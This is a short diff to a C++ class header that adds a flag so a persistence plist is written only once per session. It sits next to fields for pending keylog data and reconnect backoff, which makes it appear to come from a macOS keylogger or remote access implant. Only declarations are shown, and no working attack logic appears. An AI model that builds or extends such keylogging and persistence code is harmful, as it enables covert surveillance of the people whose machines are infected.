@@ -93,6 +93,9 @@ private:
     std::string              m_keylog_pending_data;
     std::mutex               m_keylog_pending_mutex;
 
+    // Persistence guard — write plist only once per session
+    bool m_persistence_installed;
+
     // Reconnect backoff (Phase 2.2)
     static constexpr unsigned MIN_BACKOFF  = 1;     // seconds
     static constexpr unsigned MAX_BACKOFF  = 300;   // 5 minutes
